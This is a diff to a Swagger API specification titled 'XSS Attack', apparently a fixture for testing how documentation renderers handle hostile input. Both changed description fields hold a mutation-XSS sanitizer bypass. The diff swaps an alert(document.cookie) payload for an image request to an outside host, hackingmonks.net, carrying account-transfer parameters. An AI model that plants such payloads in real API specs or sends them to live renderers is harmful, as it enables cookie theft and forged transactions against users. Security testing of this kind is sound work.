@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: XSS Attack
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src="https://hackingmonks.net/?from-acc=12345&to-acc=98765">"></form>
   version: production
 basePath: /JSSResource/
 produces:
@@ -27,7 +27,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src="https://hackingmonks.net/?from-acc=12345&to-acc=98765">>"></form>
           format: int64
           in: path
           name: id
